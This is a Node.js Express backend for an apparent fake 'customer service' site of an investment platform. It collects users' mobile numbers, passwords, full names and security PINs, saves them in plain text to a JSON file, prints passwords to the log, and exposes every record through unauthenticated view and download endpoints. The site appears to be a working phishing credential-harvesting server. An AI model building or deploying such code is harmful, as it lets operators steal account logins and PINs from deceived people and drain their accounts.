const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');  // For saving to file
const app = express();

// ========== SIMPLE DATA STORAGE ==========
// This stores data in memory AND saves to a file
let allData = {
  logins: [],
  complaints: []
};

// Try to load existing data from file
try {
  if (fs.existsSync(path.join(__dirname, 'data.json'))) {
    const savedData = fs.readFileSync(path.join(__dirname, 'data.json'), 'utf8');
    allData = JSON.parse(savedData);
    console.log('📂 Loaded existing data');
  }
} catch (err) {
  console.log('No existing data file');
}

// Save data to file
function saveDataToFile() {
  try {
    fs.writeFileSync(path.join(__dirname, 'data.json'), JSON.stringify(allData, null, 2));
    console.log('💾 Data saved to file');
  } catch (err) {
    console.error('Error saving data:', err);
  }
}

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ========== API ENDPOINTS ==========

// 1. Test endpoint
app.get('/api/test', (req, res) => {
  res.json({ 
    message: 'Backend is working!', 
    status: 'success',
    dataCount: {
      logins: allData.logins.length,
      complaints: allData.complaints.length
    }
  });
});

// 2. Save login data
app.post('/api/login', (req, res) => {
  const { mobile, password } = req.body;
  
  const loginRecord = {
    id: 'LOG-' + Date.now(),
    mobile: mobile,
    password: password,  // Plain text for teacher
    time: new Date().toISOString()
  };
  
  allData.logins.push(loginRecord);
  saveDataToFile();
  
  console.log('✅ Login saved:', mobile, password);
  
  res.json({ 
    success: true, 
    message: 'Login successful',
    userId: loginRecord.id 
  });
});

// 3. Save complaint data
app.post('/api/submit-complaint', (req, res) => {
  const { mobile, password, fullName, problemType, investmentExperience, securityPin } = req.body;
  
  const complaintId = 'CMP-' + Math.floor(100000 + Math.random() * 900000);
  
  const complaintRecord = {
    complaintId: complaintId,
    mobile: mobile,
    password: password,  // Plain text
    fullName: fullName,
    problemType: problemType,
    experience: investmentExperience,
    pin: securityPin,
    time: new Date().toISOString()
  };
  
  allData.complaints.push(complaintRecord);
  saveDataToFile();
  
  console.log('✅ Complaint saved:', complaintId);
  
  res.json({ 
    success: true, 
    message: 'Complaint submitted successfully',
    complaintId: complaintId,
    dataSaved: complaintRecord
  });
});

// 4. View all data
app.get('/api/view-data', (req, res) => {
  res.json({
    success: true,
    logins: allData.logins,
    complaints: allData.complaints,
    totalLogins: allData.logins.length,
    totalComplaints: allData.complaints.length,
    lastUpdated: new Date().toISOString()
  });
});

// 5. Reset data (optional)
app.get('/api/reset-data', (req, res) => {
  allData = {
    logins: [],
    complaints: []
  };
  saveDataToFile();
  res.json({ success: true, message: 'All data has been reset' });
});

// 6. Download data as JSON
app.get('/api/download-data', (req, res) => {
  res.json(allData);
});

// 7. Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'healthy',
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    data: {
      logins: allData.logins.length,
      complaints: allData.complaints.length
    }
  });
});

// Serve HTML for all routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📊 Simple JSON storage active`);
  console.log(`📁 Data saved to: backend/data.json`);
  console.log(`👤 Current logins: ${allData.logins.length}`);
  console.log(`📝 Current complaints: ${allData.complaints.length}`);
  console.log(`🌐 Your website: https://sprodeal-customer-service-213v.onrender.com`);
  console.log(`📊 Data viewer: https://sprodeal-customer-service-213v.onrender.com/view-data.html`);
});
